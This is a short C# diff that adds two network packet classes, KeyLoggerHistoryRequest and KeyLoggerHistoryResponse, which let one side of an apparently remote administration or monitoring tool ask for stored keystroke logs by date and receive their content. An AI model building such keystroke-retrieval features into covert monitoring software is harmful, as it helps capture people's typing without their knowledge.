@@ -55,6 +55,27 @@ namespace Common.Networking
         }
         public bool Vietnamese { get; set; }
     }
+
+    public sealed class KeyLoggerHistoryRequest : BasePacket
+    {
+        public KeyLoggerHistoryRequest()
+        {
+            PacketType = PacketType.KeyLoggerHistoryRequest;
+        }
+        public string DateKey { get; set; } = string.Empty; // yyyy-MM-dd
+    }
+
+    public sealed class KeyLoggerHistoryResponse : BasePacket
+    {
+        public KeyLoggerHistoryResponse()
+        {
+            PacketType = PacketType.KeyLoggerHistoryResponse;
+        }
+        public string DateKey { get; set; } = string.Empty;
+        public string Content { get; set; } = string.Empty;
+        public bool Exists { get; set; }
+        public string? Error { get; set; }
+    }
 }
 
 
